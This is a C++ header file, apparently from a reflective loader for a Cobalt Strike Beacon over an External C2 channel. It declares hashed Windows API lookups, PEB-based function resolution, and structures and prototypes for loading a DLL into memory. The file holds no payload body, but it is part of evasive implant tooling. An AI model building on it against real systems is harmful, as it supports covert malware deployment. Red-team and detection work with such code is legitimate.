#pragma once
//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN

#include "BeaconUserData.h"
#include "Hash.h"
#include "LoaderTypes.h"
#include "TrackMemory.h"

constexpr DWORD CREATETHREAD_HASH = CompileTimeHash("CreateThread");
constexpr DWORD CREATEEVENTA_HASH = CompileTimeHash("CreateEventA");
constexpr DWORD SLEEP_HASH = CompileTimeHash("Sleep");

typedef HANDLE(WINAPI* CREATETHREAD)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* CREATEEVENTA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef void(WINAPI* SLEEP)(DWORD);

typedef struct _EXTC2_LOADER_APIS {
    WINDOWSAPIS Base;
    CREATEEVENTA CreateEventA;
    CREATETHREAD CreateThread;
    SLEEP Sleep;
} EXTC2_LOADER_APIS, *PEXTC2_LOADER_APIS;

typedef struct _TARGET_DLL{
    PALLOCATED_MEMORY_REGION Region;
    ULONG_PTR RawBaseAddress;
    SIZE_T     ImageSize;
    ULONG_PTR EntryPoint;
    PIMAGE_NT_HEADERS PEHeader;
    DWORD State;
    DWORD Protection;
} TARGET_DLL, *PTARGET_DLL;

typedef struct _EXTC2_SYNC_INFO {
    HANDLE ExtC2Init;
    HANDLE ExtC2StopEvent;
    HANDLE ExtC2SleepEvent;
    HANDLE ExtC2ContinueEvent;
} EXTC2_SYNC_INFO, *PEXTC2_SYNC_INFO;

BOOL ExtC2LoaderResolveFunctions(_PPEB pebAddress, PEXTC2_LOADER_APIS winApi);
BOOL ExtC2LoaderLoadDll(PTARGET_DLL targetDll, PWINDOWSAPIS winApis);
ULONG_PTR ExtC2LoaderAllocateMemory(PTARGET_DLL targetDll, PWINDOWSAPIS winApis, PALLOCATED_MEMORY_CLEANUP_INFORMATION cleanupMemoryInformation);
